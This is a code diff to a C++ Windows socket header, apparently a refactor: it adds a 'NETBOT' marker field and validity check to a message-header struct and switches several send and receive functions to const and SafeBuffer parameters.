@@ -7,6 +7,7 @@
 
 #include <winsock2.h>
 #include "mstcpip.h"
+#include "SafeBuffer.h"
 
 // SOCKET buffer max length
 #define BUFFER_MAXLEN		    1024*2
@@ -171,18 +172,26 @@ typedef struct tagMsgHead {
     DWORD dwSize;      //数据长度   /数据长度
     DWORD dwExtend1;   //附加数据   /压缩前长度
     DWORD dwExtend2;   //附加数据   /压缩后长度
+    char dwFlag[8];    //固定标识   /NETBOT
+    tagMsgHead() {
+        memset(this, 0, sizeof(tagMsgHead));
+        memcpy(dwFlag, "NETBOT", sizeof("NETBOT"));
+    }
+    bool IsValid() const {
+        return memcmp(dwFlag, "NETBOT", sizeof("NETBOT")) == 0;
+    }
 } MsgHead,*LPMsgHead;
 
 //开启TCP保活机制
 BOOL TurnonKeepAlive(SOCKET s, UINT nKeepAliveSec);
 
 //发送数据
-BOOL SendData(SOCKET s, char *data, int len);
+BOOL SendData(SOCKET s, const char *data, int len);
 //接收数据
 BOOL RecvData(SOCKET s, char *data, int len);
 //发送消息
-BOOL SendMsg(SOCKET s, char const *pBuf, LPMsgHead lpMsgHead);
+BOOL SendMsg(SOCKET s, SafeBuffer pBuf, LPMsgHead lpMsgHead);
 //接收消息
-BOOL RecvMsg(SOCKET s,char *pBuf, LPMsgHead lpMsgHead);
+BOOL RecvMsg(SOCKET s, SafeBuffer pBuf, LPMsgHead lpMsgHead);
 
 #endif
